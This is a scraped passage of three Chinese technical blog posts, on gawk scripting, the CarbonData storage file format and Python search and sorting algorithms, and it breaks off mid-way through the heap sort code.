 <=  >=  >  <\n \n匹配字符串：注意这时候是完全匹配\n$gawk –F, ‘$1==”data” {print $1}’ data1\n第一个字段必须是data，而不是包含data\n \n22.4 结构化命令\n \n22.4.1 if语句\n给if语句定义一个求值的条件，并将其用圆括号括起来。\n条件为真在if后面的语句就会执行。\n还可以接上else。和C语言的差不多\n例子：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat data4\n3\n5\n34\n467\n1\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat ifscript \n{\n         if ($1 > 29)\n         {\n                   print \"$1 > 29\"  # 多条命令需要用{}括起来\n                   print $1\n         }\n         else if($1 == 3)  \n         {\n                   print \"step 2 $1 == 3\"\n         }        \n         else\n         {\n                   print \"step 3 \"\n         }\n}\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk -f ifscript data4\nstep 2 $1 == 3\nstep 3 \n$1 > 29\n34\n$1 > 29\n467\nstep 3 \nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n \n还可以在单行上使用else子句，这样就需要在if后面接上分号；\n$ gawk '{if($1 == 3) print $1\" == 3 \"; else print $1,\"!= 3\"}' data4\n \n22.4.2 while 语句\n基本格式：\nwhile (condition)\n{\n  statement\n}\n \nwhile里面还可以放break和continue。用起来跟C语言一样\n \n例子：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat data5\n100 110 120\n170 180 190 \n300 310 320\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat script6 \n{\ntotal=0\ni=1\nwhile(i < 4)\n{\n         total += $i\n         i++\n         if(i==3)\n         {\n                   break\n                   #continue\n         }\n         print \"i=\", i\n}\navg=total/3\nprint \"Average:\",avg\n}\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk -f script6 data5\ni= 2\nAverage: 70\ni= 2\nAverage: 116.667\ni= 2\nAverage: 203.333\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n \n \n \n22.4.3 do-while语句\n和while语句类似，但是会在检查条件语句之前执行命令。格式如下：\ndo\n{\n  statement\n} while(condition)\n \n这种格式保证了语句在条件被求值之前至少执行一次\n例子：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat script7\n{\ntotal=0\ni=1\ndo\n{\n         total += $i\n         i++\n} while(total < 300)\nprint \"total:\",total,\"i=\",i\n}\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk -f script7 data5\ntotal: 330 i= 4\ntotal: 350 i= 3\ntotal: 300 i= 2\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n \n22.4.4 for语句\n支持C风格的for循环：\n例子：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat script8 \n{\ntotal=0\nfor(i=1; i<4; i++)\n{\n         total += $i\n}\navg=total/3\nprint \"Total:\",total,\"Average:\",avg\n}\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk -f script8 data5\nTotal: 330 Average: 110\nTotal: 540 Average: 180\nTotal: 930 Average: 310\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n \n \n22.5 格式化打印\nprint打印在如何显示数据上并未提供多少控制。\n下面介绍一个格式化打印命令，printf，和C语言的那个有点类似：\nprintf “format string” ,var1,var2…\n前面也是格式化命令。跟C语言很像：\n1）\n%c 输出字符， %d 整数值， %i 整数值，%e 用科学计数法显示数\n%f 浮点数，%g 科学计数法或浮点数显示（较短的）\n%o 八进制，%s 字符串\n%x 十六进制小写，%X 十六进制大写\n2）\n还有三种修饰符可以用来进一步控制输出\nwidth：指定输出字段最小宽度的数字值。实际比这短，则会补充空格，否则按正常输出\nprec：指定浮点数中小数点后面的位数。或者文本字符串中显示的最大字符数\n-(减号)：指明在格式化空间中放入数据时采用左对齐，而不是右对齐\n例子：\n\n$ cat data3\nkobe bryant\n24 Los Lakers\nLos, road34\n99038\n \nPaul Gaoso\n15 los Lakers\nLos, road 38\n23123\n$ gawk 'BEGIN{FS=\"\\n\"; RS=\"\"} {printf \"%s %s\\n\", $1,$2}' data3  #正常输出\nkobe bryant 24 Los Lakers\nPaul Gaoso 15 los Lakers\n$ gawk 'BEGIN{FS=\"\\n\"; RS=\"\"} {printf \"%16s %s\\n\", $1,$2}' data3  #指定输出字段最小宽度\n     kobe bryant 24 Los Lakers\n      Paul Gaoso 15 los Lakers\n$ gawk 'BEGIN{FS=\"\\n\"; RS=\"\"} {printf \"%-16s %s\\n\", $1,$2}' data3  #指定左对齐\nkobe bryant      24 Los Lakers\nPaul Gaoso       15 los Lakers\n\n还可以指定浮点数格式\n… {printf “%5.1f\\n”, avg} …\n占5位，小数点后只显示一位。\n \n22.6 内建函数\ngawk提供了不少内建的函数，可以进行常见的数学 字符串以及时间函数运算\n \n22.6.1 数学函数\n\n\n\n\n函数\n\n\n描述\n\n\n\n\natan2(x,y)\n\n\nx/y的反正切，x y以弧度为单位\n\n\n\n\ncos(x)\n\n\nX的余弦 x以弧度为单位\n\n\n\n\nexp(x)\n\n\nX的指数函数\n\n\n\n\nint(x)\n\n\nX的整数部分，取靠近零一侧的值\n\n\n\n\nlog(x)\n\n\nX的自然对数\n\n\n\n\nrand(x)\n\n\n比0大比1小的随机浮点数\n\n\n\n\nsin(x)\n\n\n正弦，x以弧度为单位\n\n\n\n\nsqrt(x)\n\n\nX的平方根\n\n\n\n\nsrand(x)\n\n\n为计算随机数指定一个种子值\n\n\n\n\nand(v1,v2)\n\n\n执行v1和v2的按位与运算\n\n\n\n\ncompl(val)\n\n\n执行val的补运算\n\n\n\n\nlshift(val,count)\n\n\nVal的值左移count位\n\n\n\n\nor(v1,v2)\n\n\nV1和v2的按位或运算\n\n\n\n\nrshift(val,count)\n\n\nVal右移count位\n\n\n\n\nxor(v1,v2)\n\n\nV1和v2的异或运算\n\n\n\n\n \n例子：\n\n$ gawk 'BEGIN{x=rand(); print \"x =\",x}'\n$gawk 'BEGIN{x=int(-7.6); print \"x =\",x}'\n$ gawk 'BEGIN{x=sin(1.57); print \"x =\",x}'\n$ gawk 'BEGIN{x=int(10*rand()); print \"x =\",x}'\n$ gawk 'BEGIN{x=and(1,2); print \"x =\",x}'\n$ gawk 'BEGIN{x=lshift(1,2); print \"x =\",x}'\n$ gawk 'BEGIN{x=xor(1,2); print \"x =\",x}'\n\n \n22.6.2 字符串函数\n \n\n\n\n\n函数\n\n\n描述\n\n\n\n\nasort(s [,d])\n\n\n将数组s按数据元素值排序。索引值会被替换成表示新的排序顺序的连续数字。另外如果指定了d，则排序后的数组会存储在数组d中。\n\n\n\n\nasorti(s [,d])\n\n\n将数组s按索引值排序。生成的数组会将索引值作为数据元素值，用连续数字所以来表明排序顺序。若指定了d，排序后是数组会存在d中\n\n\n\n\ngensub(r,s,h [,t])\n\n\n查找变量$0或目标字符串t（若提供的话）来匹配正则表达式r。\n如果h是一个以g或G开头的字符串，就用s替换掉匹配的文本。\n如果h是数字，它表示要替换掉的第h处r匹配的地方\n\n\n\n\ngsub(r,s [,t])\n\n\n查找变量$0或目标字符串t(若提供的话)来匹配正则表达式。\n如果找到了就全部替换成字符串s\n\n\n\n\nindex(s,t)\n\n\n返回字符串t在字符串s中的索引值。如果没找到返回0\n\n\n\n\nlength([s])\n\n\n返回字符串s的长度，如果没有指定的话返回$0的长度\n\n\n\n\nmatch(s, r [,a])\n\n\n返回字符串s中正则表达式r出现位置的索引。若指定数组a，则会存储s中匹配正则表达式的那部分\n\n\n\n\nsplit(s, a [,r])\n\n\n将s用FS字符或正则表达式r（若指定的话）分开放到数组a中。返回字段总数\n\n\n\n\nsprintf(format,variables)\n\n\n用提供的format和variables返回一个类似于printf输出的字符串\n\n\n\n\nsub(r,s [,t])\n\n\n在变量$0或目标字符串t中查找正则表达式t的匹配。若找到了，就用字符串s替换掉第一处匹配\n\n\n\n\nsubstr[s,i [,n]]\n\n\n返回s从索引值i开始的n个字符组成的字符串。若未提供n，则返回s剩下的部分\n\n\n\n\ntolower(s)\n\n\n全部转小写\n\n\n\n\ntoupper(s)\n\n\n全部转大写\n\n\n\n\n \n \n有些用起来比较简单，比如大小写，求长度\n\n$ gawk 'BEGIN{x=length(\"chong\"); print \"x =\",x}'\n$ gawk 'BEGIN{x=toupper(\"chong\"); print \"x =\",x}'\n\n \n下面是asort的例子：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat script9\nBEGIN{\nvar[\"a\"]=177\nvar[\"b\"]=9\nvar[\"c\"]=3\nvar[\"d\"]=4444\nvar[\"e\"]=566\nasort(var,test)\nfor (i in test)\n{\n         print \"Index:\",i,\"-value:\",test[i]\n}\n}\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk -f script9\nIndex: 4 -value: 566\nIndex: 5 -value: 4444\nIndex: 1 -value: 3\nIndex: 2 -value: 9\nIndex: 3 -value: 177\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n注意看对var数组的数据元素进行排序了。排序后的数组放在test数组里面了。\n索引值被替换成了数字。索引最大的对应数据元素也是最大的。\n \n下面是split的例子：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat data1 \ndata11,data12,data13,data14\ndata21,data22,data23,data24\ndata31,data32,data33,data34\ndata41,data42,data43,data44\ndata51,data52,data53,data54\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat script10\nBEGIN{\nFS=\",\"\n}\n{\ncount=split($0,test)\nfor (i in test)\n{\n         print \"Index:\", i, \"-Value:\",test[i]\n}\nprint \"count =\",count\n#print test[1], test[5]\n}\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk -f script10 data1\n\n \n将每一行用FS字符（,）分开，放到了test数组上。再打印数组的数据。\ncount表示字段总数\n22.6.3 时间函数\n\n\n\n\n函数\n\n\n描述\n\n\n\n\nmktime(datadpace)\n\n\n将一个按YYYYMMDDHHMMSS[DST]格式指定的日期转成时间戳值\n\n\n\n\nstrftime(format [,timestamp])\n\n\n将当前时间的时间戳或timestamp（若提供的话）转化格式化日期（采用shell函数data()的格式）\n\n\n\n\nsystime()\n\n\n返回当前时间的时间戳\n\n\n\n\n \n例子：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat script11\nBEGIN{\ndate=systime()\nday=strftime(\"%A, %B %d, %Y\",date)\nprint day\n}\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk -f script11\n星期六, 十一月 25, 2017\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n 注意：BEGIN后面的{要挨着BEGIN写，不能换行写。\n否则报错\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk -f script11\ngawk: script11:2: BEGIN 块必须有一个行为部分\n22.7 自定义函数\n22.7.1 定义函数\n必须要用function关键字，格式如下：\nfunction name([variables])\n{\n  statement\n}\n函数名必须能够统一标识函数。可以在调用的gawk程序中传给这个函数一个或多个变量\n \n例子：\n// 打印记录中的第三个字段\nfunction printthird()\n{\n  print $3\n}\n \n还可以用return返回值。\n例子：\nfunction myrand(limit)\n{\n  return int(limit * rand())\n}\n用法：\nx=myrand(100)\n \n22.7.2 使用自定义函数\n定义函数时，它必须出现在所有代码块之前（包括BEGIN代码块）。\n实例：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat data3\nkobe bryant\n24 Los Lakers\nLos, road34\n99038\n \nPaul Gaoso\n15 los Lakers\nLos, road 38\n23123\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat fun1\nfunction myprint()\n{\n         print \"This is myprint() +++\"\n         printf \"%-16s - %s\\n\", $1,$4\n}\nBEGIN{\nFS=\"\\n\"\nRS=\"\"\n}\n{\nmyprint()\n}\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk -f fun1 data3\nThis is myprint() +++\nkobe bryant      - 99038\nThis is myprint() +++\nPaul Gaoso       - 23123\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n \n先格式化记录中的第一个和第四个数据字段。再输出\n定义了函数就可以在程序的代码中随便使用了\n \n22.7.3 创建函数库\n可以将多个函数放到一个库文件中，这样就能在所有的gawk程序中使用了。\n步骤：\n1）先创建一个存储所有gawk函数的文件\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat funlib \nfunction mylib()\n{\n         print \"mylib() +++\"\n}\nfunction myprint()\n{\n         printf \"%-16s - %s\\n\",$1,$4\n}\nfunction myrand(limit)\n{\n         return int(limit * rand())\n}\nfunction printthird()\n{\n         print $3\n}\n\n2）就可以在脚本中使用啦\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat usefunlib \nBEGIN{\nFS=\"\\n\"\nRS=\"\"\n}\n{\nmyprint()\n}\nxcy@xcy-virtual-machine:~/shell/22zhang$ gawk -f funlib -f usefunlib data3\nkobe bryant      - 99038\nPaul Gaoso       - 23123\nxcy@xcy-virtual-machine:~/shell/22zhang$\n\n要引用文件需要使用-f参数。可以在同一命令行中使用多个-f参数。\n \n22.8 实例\n假设有一个数据文件，里面有两支队伍每队2个人，每人3次的比赛成绩。要求总成绩和平均成绩：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat scores.txt \nRich Blum,team1,100,115,99\nBar Blum,team1,110,118,114\nChr Bre,team2,120,80,90\nTim Bre,team2,125,70,60\n\n \n下面是脚本：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ cat bowling.sh\n#!/bin/bash\nfor team in $(gawk -F, '{print $2}' scores.txt | uniq)\ndo\n#       echo \"team: $team\"\n         gawk -v team=$team 'BEGIN{FS=\",\";total=0}\n         {\n#                print \"step1+++\"\n                   if ($2==team)\n                   {\n                            total += $3 + $4 + $5;\n                   }\n         }\n         END{\n                   avg = total / 6;\n                   print \"Total for\",team,\"is\",total,\"The avgarge is\",avg\n         }' scores.txt\ndone\n\n脚本分析：\n1）注意uniq这个关键字，这里可以排除一样的。for语句是用来筛选队名的。\n2）for循环里面，假如队名是team1，那么就先处理team1。会读取所有记录，将队名都为team1的记录的$3 $4 $5相加，就是总成绩了。最后求平均值\n \n这里是运行情况：\n\nxcy@xcy-virtual-machine:~/shell/22zhang$ ./bowling.sh \nTotal for team1 is 656 The avgarge is 109.333\nTotal for team2 is 545 The avgarge is 90.8333\n"},{"title":"Carbondata源码系列（二）文件格式详解","body":"在上一章当中，写了文件的生成过程。这一章主要讲解文件格式（V3版本）的具体细节。\n1、字典文件格式详解\n字典文件的作用是在存储的时候将字符串等类型转换为int类型，好处主要有两点：\n1、减少存储占用空间\n2、用在需要group by的字段上比较合适，可以减少计算时的shuffle的数据量。\n每一个字典列都有对应的三种文件.dict, .sortindex, .dictmeta文件，输出格式都是thrift格式\n1.1 .dict文件\n字典的值每满1000就作为一个chunk输出一次，具体的类是ColumnDictionaryChunk\n相关参数：\ncarbon.dictionary.chunk.size\n1.2 .sortindex文件\n把字段的值sort了一下之后，计算出每个值的sortIndex和invertedIndex，具体的类是ColumnSortInfo\n1、List<SortIndex>，记录着每个字典值的surrogate，从1开始\n2、List<SortInvertedIndex>，记录着每个字典surrogate在数组中的位置，从1开始\n它们的关系如下：\n\n      sortIndex[i] = dictionarySortModel.getKey();\n      // the array index starts from 0 therefore -1 is done to avoid wastage\n      // of 0th index in array and surrogate key starts from 1 there 1 is added to i\n      // which is a counter starting from 0\n      sortIndexInverted[dictionarySortModel.getKey() - 1] = i + 1;\n\n假设字典值是beijing，shenzhen，shanghai\n\n\n\n城市\nsurrogate\nsortIndex\ninvertIndex\n\n\nbeijing\n1\n1\n1\n\n\nshenzhen\n2\n3\n3\n\n\nshanghai\n3\n2\n2\n\n\n\n \n \n \n1.3 .dictmeta文件\n该文件主要记录字典的以下属性，具体的类是ColumnDictionaryChunkMeta\n1、最小key\n2、最大的key\n3、开始offset\n4、结束offset\n5、chunk的数量\n2、数据文件详解\n2.1 数据块的组成部分\nCarbonRow在sort阶段会被分成3个部分:\n1、字典列\n2、非字典维度列和高基数列\n3、度量值列\n在写入的时候，先写入到TablePage里，TablePage会把数据拆分成4部分\n\n// one vector to make it efficient for sorting\nprivate ColumnPage[] dictDimensionPages;\nprivate ColumnPage[] noDictDimensionPages;\nprivate ComplexColumnPage[] complexDimensionPages;\nprivate ColumnPage[] measurePages;\n\n 每个TablePage都会记录以下几个Key：\n\nprivate byte[][] currentNoDictionaryKey;\n// MDK start key\nprivate byte[] startKey;\n// MDK end key\nprivate byte[] endKey;\n// startkey for no dictionary columns\nprivate byte[][] noDictStartKey;\n// endkey for no diciotn\nprivate byte[][] noDictEndKey;\n// startkey for no dictionary columns after packing into one column\nprivate byte[] packedNoDictStartKey;\n// endkey for no dictionary columns after packing into one column\nprivate byte[] packedNoDictEndKey;\n\n数据在一行一行写到TablePage之后，最后会做一次统一的编码，详细的方法请看TablePage的encode方法。\nPage的meta信息\n\n  private DataChunk2 buildPageMetadata(ColumnPage inputPage, byte[] encodedBytes)\n      throws IOException {\n    DataChunk2 dataChunk = new DataChunk2();\n    dataChunk.setData_page_length(encodedBytes.length);\n    fillBasicFields(inputPage, dataChunk);\n    fillNullBitSet(inputPage, dataChunk);\n    fillEncoding(inputPage, dataChunk);\n    fillMinMaxIndex(inputPage, dataChunk);\n    fillLegacyFields(dataChunk);\n    return dataChunk;\n  }\n\n一个blocket的阈值是64MB，一个blocket包括N个TablePage，当写满一个TablePage之后，就把blocket写入到文件当中。\ncarbondata的BTree索引，是一个记录着每个Blocklet的mdk的startKey和endKey，以及Blocklet当中所有TablePage的列的最大最小值\n那么数据文件的详细格式，基本和官网上介绍的是一致的\n\n2.2 What is MDK\nmdk和hbase的rowkey是一个性质的，详细可以看下面这张图，排序方式跟hbase没有任何区别。但是carbondata的mdk只能是字典列，如果我没有建立字典列的话，只是设置了SORT_COLUMN，Carbondata的过滤只是靠列的最大最小值\n\n \n3、索引文件详解\n索引文件以.carbonindex结尾\n索引文件包括三个部分：索引头，索引两部分\n索引头包括：\n1、文件格式版本(当前版本是V3)\n2、Segment信息（有多少列，列的基数）\n3、列的信息\n4、bucket ID\n \n索引信息包括以下信息：\n1、Blocket的记录数\n2、数据文件名\n3、Blocket的meta信息offset\n3、BlockletIndex (BTree索引，包含blocket的startKey、endKey，以及每一列的最大最小值，这个前面已经讲过了)\n4、BlocketInfo（记录数，每个TablePage的offset，每个TablePage的长度，维度列dimension_offsets的起始位置，度量值measure_offsets的起始位置，有多少个TablePagenumber_number_of_pages）\n \n索引文件的信息在文件的footer当中也是存在的，在carbondata1.2当中索引文件还是有很多个，感觉有点多余。\n到carbondata1.3会被合并成一个文件，这样就能大大缩短启动的时候加载索引的开销。\n \n \n岑玉海\n转载请注明出处，谢谢！\n \n \n"},{"title":"算法（Python）","body":"算法就是为了解决某一个问题而采取的具体有效的操作步骤\n算法的复杂度，表示代码的运行效率，用一个大写的O加括号来表示，比如O(1)，O(n)\n认为算法的复杂度是渐进的，即对于一个大小为n的输入，如果他的运算时间为n3+5n+9，那么他的渐进时间复杂度是n3\n递归\n递归就是在函数中调用本身，大多数情况下，这会给计算机增加压力，但是有时又很有用，比如下面的例子：\n汉诺塔游戏\n\n把A柱的盘子，移动到C柱上，最少需要移动几次，大盘子只能在小盘子下面\n递归实现：\n\ndef hanoi(x, a, b, c):  # 所有的盘子从 a 移到 c\n\n    if x > 0:\n        hanoi(x-1, a, c, b)  # step1：除了下面最大的，剩余的盘子 从 a 移到 b\n        print('%s->%s' % (a, c))  # step2:最大的盘子从 a 移到 c\n        hanoi(x-1, b, a, c)  # step3: 把剩余的盘子 从 b 移到 c\n\nhanoi(10, 'A', 'B', 'C')\n\n#计算次数\n\ndef h(x):\n    num = 1\n    for i in range(x-1):\n        num = 2*num +1\n\n    print(num)\nh(10)\n\n用递归打印斐波那契数列\n\ndef fei(n):\n    if n == 0:\n        return 0\n    elif n == 1:\n        return 1\n    else:\n        return fei(n-1)+fei(n-2)\n\n你会发现，即使n只有几十的时候，你的计算机内存使用量已经飙升了\n其实，如果结合生成器，你会发现不管n有多大，都不会出现卡顿，但这是生成器的特性，本篇博客不重点介绍\n\n# 结合生成器\ndef fei(n):\n    pre,cur = 0,1\n    while n >=0:\n        yield pre\n        n -= 1\n        pre,cur = cur,pre+cur\n\nfor i in fei(400000):\n    print(i)\n\n \n关于递归次数，Python中有个限制，可以通过sys模块来修改\n\nimport sys\nsys.setrecursionlimit(1000000)\n\n \n\n \n查找\n1.顺序查找\n这个没的说，就是for循环呗，时间复杂度O(n)\n\ndef linear_search(data_set, value):\n    for i in range(len(data_set)):\n        if data_set[i] == value:\n            return i\n    return\n\n \n2.二分查找\n时间复杂度O(logn)\n就是一半一半的查找，看目标值在左边一半还是右边一半，然后替换左端点或者右端点，继续判断\n非递归版本：\n\ndef binary_serach(li,val):\n    low = 0\n    high = len(li)-1\n    while low <= high:\n        mid = (low+high)//2\n        if li[mid] == val:\n            return mid\n        elif li[mid] > val:\n            high = mid-1\n        else:\n            low = mid+1\n    else:\n        return None\n\n 递归版本的二分查找\n\ndef bin_search_rec(data_set, value, low, high):\n    if low < high:\n        mid = (low + high) // 2\n        if data_set[mid] == value:\n            return mid\n        elif data_set[mid] > value:\n            return bin_search_rec(data_set, value, low, mid - 1)\n        else:\n            return bin_search_rec(data_set, value, mid + 1, high)\n    else:\n        return None\n\n \n\n \n排序\n速度慢的三个：\n1.冒泡排序\n　　原理就是，列表相邻的两个数，如果前边的比后边的小，那么交换顺序，经过一次排序后，最大的数就到了列表最前面\n　　代码：　　\n\ndef bubble_sort(li):\n\n    for j in range(len(li)-1):\n        for i in range(1, len(li)):\n            if li[i] > li[i-1]:\n                li[i], li[i-1] = li[i-1], li[i]\n\n    return li\n\n冒泡排序的最差情况，即每次都交互顺序的情况，时间复杂度是O(n2)\n存在一个最好情况就是列表本来就是排好序的，所以可以加一个优化，加一个标志位，如果没有出现交换顺序的情况，那就直接return \n\n# 优化版本的冒泡\ndef bubble_sort_opt(li):\n    for j in range(len(li)-1):\n        flag = False\n        for i in range(1, len(li)):\n            if li[i] > li[i-1]:\n                li[i], li[i-1] = li[i-1], li[i]\n                flag = True\n        if not flag:\n            return li\n    return li\n\n 2.插入排序\n　　原理：把列表分为有序区和无序区两个部分。最初有序区只有一个元素。然后每次从无序区选择一个元素，插入到有序区的位置，直到无序区变空。\n\ndef insert_sort(li):\n    for i in range(1,len(li)):\n        tmp = li[i]\n        j = i - 1\n        while j >= 0 and tmp < li[j]:　　　　# 找到一个合适的位置插进去\n            li[j+1] = li[j]\n            j -= 1\n        li[j+1] = tmp\n    return li\n\n时间复杂度是O(n2)\n \n3.选择排序\n　　原理：遍历列表一遍，拿到最小的值放到列表第一个位置，再找到剩余列表中最小的值，放到第二个位置。。。。\n\ndef select_sort(li):\n    for i in range(len(li)-1):\n        min_loc = i         # 假设当前最小的值的索引就是i\n        for j in range(i+1,len(li)):\n            if li[j] < li[min_loc]:\n                min_loc = j\n        if min_loc != i:   # min_loc 值如果发生过交换，表示最小的值的下标不是i,而是min_loc\n            li[i],li[min_loc] = li[min_loc],li[i]\n\n    return li\n\n时间复杂度是O(n2)\n \n \n速度快的几种排序：\n4.快速排序（快排）\n原理：让指定的元素归位，所谓归位，就是放到他应该放的位置（左变的元素比他小，右边的元素比他大），然后对每个元素归位，就完成了排序\n可以参考这个动图来理解下面的代码\n\n代码：\n\n#  归位函数\ndef partition(data, left, right): # 左右分别指向两端的元素\n    tmp = data[left]                # 把左边第一个元素赋值给tmp,此时left指向空\n    while left < right:             # 左右两个指针不重合，就继续\n        while left < right and data[right] >= tmp:  # right指向的元素大于tmp,则不交换\n            right -= 1                      # right 向左移动一位\n        data[left] = data[right]            # 如果right指向的元素小于tmp，就放到左边现在为空的位置\n        while left < right and data[left] <= tmp:   # 如果left指向的元素小于tmp,则不交换\n            left += 1                       # left向右移动一位\n        data[right] = data[left]            # 如果left指向的元素大于tmp,就交换到右边\n    data[left] = tmp            # 最后把最开始拿出来的那个值，放到左右重合的那个位置\n    return left                 # 最后返回这个位置\n\n#  写好归位函数后，就可以递归调用这个函数，实现排序\ndef quick_sort(data, left, right):\n    if left < right:\n        mid = partition(data, left, right)  # 找到指定元素的位置\n        quick_sort(data, left, mid - 1)     # 对左边元素排序\n        quick_sort(data, mid + 1, right)    # 对右边元素排序\n    return data\n\n正常的情况，快排的复杂度是O(nlogn)\n快排存在一个最坏情况，就是每次归位，都不能把列表分成两部分，此时复杂度就是O(n2)了，如果要避免设计成这种最坏情况，可以在取第一个数的时候不要取第一个了，而是取一个列表中的随机数\n \n5.归并排序\n原理：列表分成两段有序，然后分解成每个元素后，再合并成一个有序列表，这种操作就叫做一次归并\n　　应用到排序就是，把列表分成一个元素一个元素的，一个元素当然是有序的，将有序列表一个一个合并，最终合并成一个有序的列表\n　　\n \n图示：\n\n \n代码：\n\ndef merge(li, left, mid, right):\n    # 一次归并过程，把从mid分开的两个有序列表合并成一个有序列表\n    i = left\n    j = mid + 1\n    ltmp = []\n    # 两个列表的元素依次比较，按从大到小的顺序放到一个临时的空列表中\n    while i <= mid and j <= right:\n        if li[i] < li[j]:\n            ltmp.append(li[i])\n            i += 1\n        else:\n            ltmp.append(li[j])\n            j += 1\n\n    # 如果两个列表并不是平均分的，就会存在有元素没有加入到临时列表的情况，所以再判断一下\n    while i<= mid:\n        ltmp.append(li[i])\n        i += 1\n    while j <= right:\n        ltmp.append(li[j])\n        j += 1\n    li[left:right+1] = ltmp\n    return li\n\n\ndef _merge_sort(li, left, right):\n    # 细分到一个列表中只有一个元素的情况，对每一次都调用merge函数变成有序的列表\n    if left < right:\n        mid = (left+right)//2\n        _merge_sort(li, left, mid)\n        _merge_sort(li, mid+1, right)\n        merge(li, left, mid, right)\n    return li\n\ndef merge_sort(li):\n    return(_merge_sort(li, 0, len(li)-1))\n\n照例，时间复杂度是O(nlogn)\n特殊的，归并排序还有一个O(n)的空间复杂度\n \n6.堆排序\n把这个放到最后，是因为这个是最麻烦的，把最麻烦的放到最后，是一种对工作负责的表现\n如果要说堆排序，首先得先把‘树’搞明白\n树\n树是一种数据结构；\n树是由n个节点组成的集合； -->如果n为0，那这是一颗空树，如果n>0，那么那存在1个节点作为树的根节点，其他节点可以分为m个集合，每个集合本身又是一棵树。\n一些可能会用到的概念：\n　　根节点：树的第一个节点，没有父节点的节点\n　　叶子节点：不带分叉的节点\n　　树的深度（高度）：就是分了多少层\n　　孩子节点、父节点：节点与节点之间的关系\n图示：\n \n二叉树\n然后在树的基础上，有一个二叉树，二叉树就是每个节点最多有两个子节点的树结构，比如这个：\n\n \n满二叉树：除了叶子节点，所有节点都有两个孩子，并且所有叶子节点深度都一样\n完全二叉树：是有满二叉树引申而来，假设二叉树深度为k，那么除了第k层，之前的每一层的节点数都达到最大，即没有空的位置，而且第k层的子节点也都集中在左子树上（顺序）\n\n \n二叉树的存储方式\n有链式存储和顺序存储的方式（列表），本篇只讨论顺序存储的方式\n思考：\n　　父节点和左孩子节点的编号下标有什么关系？　　　　0-1 1-3 2-5 3-7 4-9         i  ---->   2i+1\n　　父节点和右孩子节点的编号下标有什么关系？　　　　0-2 1-4 2-6 3-8 4-10　　i  ----->  2i+2\n \n再来了解下堆，堆说起来又麻烦了，我将在另一篇博客中单独写堆，栈等这些数据结构，本篇先讨论与排序有关的东西\n堆\n堆是一类特殊的树，要求父节点大于或小于所有的子节点\n\n大根堆：一棵完全二叉树，满足任一节点都比其孩子节点大  　　，升序用大根堆\n小根堆：一棵完全二叉树，满足任一节点都比其孩子节点小\n\n \n \n堆的调整：当根节点的左右子树都是堆时，可以通过一次向下的调整来将其变换成一个堆。\n所谓一次向下调整，就是说把堆顶的值，向下找一个合适的位置，是一次一次的找，跟他交换位置的值，也要找到一个合适的位置\n　　　　“浏览器写的没保存，丢失了，所以这块不想再写了。。。”\n \n堆排序的过程\n　　1.构造堆\n　　2.得到堆顶元素，就是最大的元素\n　　3.去掉堆顶，将堆的最后一个元素放到堆顶，此时可以通过一次调整重新使堆有序\n　　4.堆顶元素为第二大元素\n　　5.重复步骤3，直到堆为空\n \n其中构造堆的过程：\n \n \n挨个出数的过程：\n\n代码：\n \n\ndef sift(li, left, right):  # left和right 表示了元素的范围，是根节点到右节点的范围，然后比较根和两个孩子的大小，把大的放到堆顶\n                                    # 和两个孩子的大小没关系，因为我们只需要拿堆顶的元素就行了\n    # 构造堆\n    i = left        # 当作根节点\n    j = 2 * i + 1   # 上面提到过的父节点与左子树根节点的编号下标的关系\n    tmp = li[left]\n    while j <= right:\n        if j+1 <= right and li[j] < li[j+1]:    # 找到两个孩子中比较大的那个\n            j = j + 1\n        if tmp < li[j]:     # 如果孩子中比较大的那个比根节点大，就交换\n            li[i] = li[j]\n            i = j           # 把交换了的那个节点当作根节点，循环上面的操作\n            j = 2 * i + 1\n        else:            \n            break\n    li[i] = tmp             # 如果上面发生交换，现在的i就是最后一层符合条件（不用换）的根节点，\n\ndef heap_sort(li):\n    n = len(li)\n    for i in range(n//2-1, -1, -1):  # 建立堆        n//2-1 是为了拿到最后一个子树的根节点的编号，然后往前走，最后走到根节点0//2 -1 = -1\n        sift(li, i, n-1)                # 固定的把最后一个值的位置当作right，因为right只是为了判断递归不要超出当前树，所以最后一个值可以满足\n                                                    # 如果每遍历一个树，就找到它的右孩子，太麻烦了\n    for i in range(n-1, -1, -1):    # 挨个出数\n        li[0], li[i] = li[i],li[0]      # 把堆顶与最后一个数交换，为了节省空间，否则还可以新建一个列表，把堆顶（最大数）放到新列表中\n        sift(li, 0, i-1)            # 